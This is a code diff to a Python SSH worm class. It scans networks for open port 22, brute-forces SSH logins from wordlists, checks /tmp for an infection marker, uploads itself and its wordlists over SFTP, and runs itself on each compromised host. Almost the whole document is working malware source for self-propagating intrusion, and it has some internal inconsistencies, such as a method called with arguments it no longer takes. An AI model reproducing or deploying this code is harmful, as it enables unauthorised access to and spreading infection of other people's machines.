@@ -11,7 +11,9 @@ class SSHConnection:
         self.username = None
         self.vulnerable_hosts = []
         self.target_host = None
-        self.worm_file = __file__
+        self.worm_file = None
+        self.password_file = None
+        self.username_file = None
         self.ssh_connection = paramiko.SSHClient()
         self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -27,8 +29,14 @@ class SSHConnection:
     def set_target(self, host):
         self.target_host = host
 
-    def set_marker_file(self, file_name):
+    def set_worm_file(self, file_name):
         self.worm_file = file_name
+
+    def set_password_file(self, file_name):
+        self.password_file = file_name
+
+    def set_username_file(self, file_name):
+        self.username_file = file_name
 
     def get_local_ip(self):
         """ Gets current machine's ip """
@@ -38,10 +46,10 @@ class SSHConnection:
         sock.close()
         return local_ip
 
-    def retrieve_vulnerable_hosts(self):
+    def retrieve_vulnerable_hosts(self, start_ip):
         """ Retrieve list of hosts to attack, removes local computer """
         port_scanner = nmap.PortScanner()
-        port_scanner.scan(self.vulnerable_hosts, arguments="-p 22 --open")
+        port_scanner.scan(start_ip, arguments="-p 22 --open")
         host_info = port_scanner.allhosts()
         live_hosts = []
         for host in host_info:
@@ -56,11 +64,11 @@ class SSHConnection:
             pass
         self.vulnerable_hosts = live_hosts
 
-    def get_usernames_and_passwords(self, username_file, password_file):
+    def get_usernames_and_passwords(self):
         """ Returns list of strings for usernames and passwords files """
-        with open(username_file, 'r') as unames:
+        with open(self.username_file, 'r') as unames:
             usernames = unames.readlines()
-        with open(password_file, 'r') as passwds:
+        with open(self.password_file, 'r') as passwds:
             passwords = passwds.readlines()
         usernames = [username.strip() for username in usernames]
         passwords = [password.strip() for password in passwords]
@@ -80,13 +88,31 @@ class SSHConnection:
                     continue
         return False
 
-    def connect_to_host(self, username_file, password_file):
-        usernames, passwords = self.get_usernames_and_passwords(username_file, password_file)
+    def find_target_host(self):
+        usernames, passwords = self.get_usernames_and_passwords(self.username_file, self.password_file)
         for host in self.vulnerable_hosts:
             found_host = self.brute_force_host(host, usernames, passwords)
-            if found_host:
+            if found_host and not self.check_if_marked():
                 return
             else:
                 continue
 
-    def
+    def check_if_marked(self):
+        stdin, stdout, stderr = self.ssh_connection.exec_command("ls /tmp/")
+        results = stdout.readlines()
+        results = [str(name) for name in results]
+        results = [name[0:-1] for name in results]
+        if __name__ in results:
+            """ System is already infected, moving on """
+            return True
+        else:
+            return False
+
+    def place_worm(self):
+        sftp_client = self.ssh_connection.open_sftp()
+        sftp_client.put(self.worm_file, "/tmp/" + self.worm_file)
+        sftp_client.put(self.password_file, "/tmp/" + self.password_file)
+        sftp_client.put(self.username_file, "/tmp/" + self.username_file)
+
+    def start_attack(self):
+        self.ssh_connection.exec_command("python /tmp/" + self.worm_file)
